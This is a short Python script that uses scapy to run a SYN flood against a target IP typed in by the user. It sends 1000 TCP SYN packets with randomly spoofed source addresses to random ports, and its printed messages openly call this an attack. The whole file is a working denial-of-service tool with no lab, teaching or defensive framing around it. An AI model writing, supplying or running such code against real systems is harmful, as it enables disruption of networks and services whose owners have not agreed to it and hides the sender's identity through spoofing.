import socket
from scapy.all import IP, TCP, send, RandShort
import random

def is_valid_ipv4_address(address):
    try:
        socket.inet_pton(socket.AF_INET, address)
        return True
    except AttributeError:  # inet_pton not available on Windows
        try:
            socket.inet_aton(address)
        except socket.error:
            return False
        return address.count('.') == 3
    except socket.error:  # not a valid address
        return False

def syn_flood(target_ip, num_packets):
    print(f"Starting SYN Flood attack on {target_ip} with {num_packets} packets.")

    for i in range(num_packets):
        # Randomize source IP address
        source_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

        # Create IP and TCP layers
        ip_layer = IP(src=source_ip, dst=target_ip)
        tcp_layer = TCP(sport=RandShort(), dport=RandShort(), flags="S")

        # Assemble and send the packet
        packet = ip_layer / tcp_layer
        send(packet, verbose=0)

        if (i + 1) % 100 == 0:
            print(f"Sent {i + 1} packets...")

    print(f"SYN Flood attack completed on {target_ip}.")

if __name__ == "__main__":
    TARGET_IP = input("Enter the target IP address: ")

    if is_valid_ipv4_address(TARGET_IP):
        NUMBER_OF_PACKETS = 1000
        try:
            syn_flood(TARGET_IP, NUMBER_OF_PACKETS)
        except Exception as e:
            print(f"An error occurred: {e}")
    else:
        print("Invalid IP address format.")

